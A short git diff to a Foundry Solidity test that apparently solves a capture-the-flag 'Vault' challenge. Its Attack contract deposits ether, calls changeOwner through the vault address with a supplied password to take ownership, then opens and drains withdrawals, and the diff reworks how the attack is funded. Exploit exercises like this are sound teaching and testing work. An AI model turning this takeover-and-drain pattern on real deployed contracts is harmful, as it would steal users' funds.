@@ -3,7 +3,6 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 import "../src/Vault.sol";
-import {Test, console} from "forge-std/Test.sol";
 
 contract Attack {
     address payable public owner;
@@ -14,8 +13,8 @@ contract Attack {
         vault = Vault(_vault);
     }
 
-    function attack(bytes32 vault_logic) public {
-        vault.deposite{value: 0.1 ether}();
+    function attack(bytes32 vault_logic) public payable {
+        vault.deposite{value: msg.value}();
         VaultLogic(address(vault)).changeOwner(vault_logic, address(this));
         vault.openWithdraw();
         vault.withdraw();
@@ -57,9 +56,7 @@ contract VaultExploiter is Test {
             0x0000000000000000000000000000000000000000000000000000000000000001
         );
         Attack attack = new Attack(payable(address(vault)));
-        (bool success, ) = payable(address(attack)).call{value: 0.1 ether}("");
-        require(success, "transfer failed");
-        attack.attack(password);
+        attack.attack{value: 0.1 ether}(password);
 
         require(vault.isSolve(), "solved");
         vm.stopPrank();
